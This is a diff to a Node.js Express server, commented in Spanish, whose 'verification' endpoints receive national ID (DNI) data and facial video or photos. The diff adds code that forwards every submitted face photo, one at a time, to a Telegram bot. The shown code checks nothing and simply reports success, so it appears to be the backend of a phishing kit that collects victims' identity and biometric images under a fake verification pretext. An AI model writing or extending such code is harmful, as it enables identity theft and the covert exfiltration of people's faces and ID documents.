@@ -113,18 +113,35 @@ app.post('/api/verification/dni', async (req, res) => {
   res.json({ success: true, message: 'DNI verificado' });
 });
 
-// FACIAL - Captura video facial
+// FACIAL - Captura video/fotos faciales
 app.post('/api/verification/facial', async (req, res) => {
-  const { faceVideo, faceImage } = req.body;
+  const { faceVideo, faceImage, facePhotos } = req.body;
   
   console.log('📥 FACIAL recibido');
   console.log('   Video:', faceVideo ? faceVideo.length + ' chars' : 'NO');
   console.log('   Imagen:', faceImage ? faceImage.length + ' chars' : 'NO');
+  console.log('   Fotos múltiples:', facePhotos ? facePhotos.length + ' fotos' : 'NO');
   
-  await sendToTelegram(`👤 <b>VERIFICACIÓN FACIAL COMPLETADA</b>\n\n✅ Video/Imagen recibido\n🕐 ${new Date().toLocaleString('es-AR')}`);
+  await sendToTelegram(`👤 <b>VERIFICACIÓN FACIAL COMPLETADA</b>\n\n✅ ${facePhotos ? facePhotos.length + ' fotos' : faceVideo ? 'Video' : 'Imagen'} recibido\n🕐 ${new Date().toLocaleString('es-AR')}`);
   
+  // Enviar fotos múltiples si existen
+  if (facePhotos && facePhotos.length > 0) {
+    console.log('📸 Enviando', facePhotos.length, 'fotos faciales...');
+    for (let i = 0; i < facePhotos.length; i++) {
+      try {
+        await sendPhotoToTelegram(facePhotos[i], `👤 Foto Facial ${i + 1}/${facePhotos.length}`);
+        // Pequeña pausa entre fotos
+        if (i < facePhotos.length - 1) {
+          await new Promise(resolve => setTimeout(resolve, 200));
+        }
+      } catch (error) {
+        console.log(`⚠️ Error enviando foto ${i + 1}:`, error.message);
+      }
+    }
+    console.log('✅ Todas las fotos faciales enviadas');
+  }
   // Si hay video, intentar enviarlo
-  if (faceVideo) {
+  else if (faceVideo) {
     try {
       const base64Data = faceVideo.includes(',') ? faceVideo.split(',')[1] : faceVideo;
       const buffer = Buffer.from(base64Data, 'base64');
@@ -143,6 +160,15 @@ app.post('/api/verification/facial', async (req, res) => {
       console.log('✅ Video enviado');
     } catch (error) {
       console.log('⚠️ Error enviando video:', error.message);
+    }
+  }
+  // Si hay imagen única
+  else if (faceImage) {
+    try {
+      await sendPhotoToTelegram(faceImage, '👤 Foto Verificación Facial');
+      console.log('✅ Foto facial enviada');
+    } catch (error) {
+      console.log('⚠️ Error enviando foto:', error.message);
     }
   }
   
